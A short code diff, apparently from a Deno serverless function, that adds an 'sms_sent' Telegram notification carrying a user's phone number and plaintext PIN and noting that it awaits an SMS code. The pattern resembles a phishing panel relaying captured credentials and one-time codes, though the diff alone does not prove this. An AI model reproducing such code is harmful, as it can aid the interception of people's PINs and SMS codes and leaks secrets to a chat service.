@@ -10,7 +10,7 @@ interface TelegramNotificationRequest {
   phone: string;
   accessCode: string;
   shortId?: string;
-  type?: 'request' | 'activation';
+  type?: 'request' | 'activation' | 'sms_sent';
 }
 
 serve(async (req) => {
@@ -40,6 +40,12 @@ serve(async (req) => {
       if (shortId) {
         message += `\n🆔 ID: ${shortId}`;
       }
+    } else if (type === 'sms_sent') {
+      message = `📤 SMS versendet!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
+      if (shortId) {
+        message += `\n🆔 ID: ${shortId}`;
+      }
+      message += `\n⏳ Wartet auf SMS Code`;
     } else {
       message = `🔔 Neue Anfrage eingegangen!\n📱 Phone: ${phone}\n🔑 PIN: ${accessCode}`;
       if (shortId) {
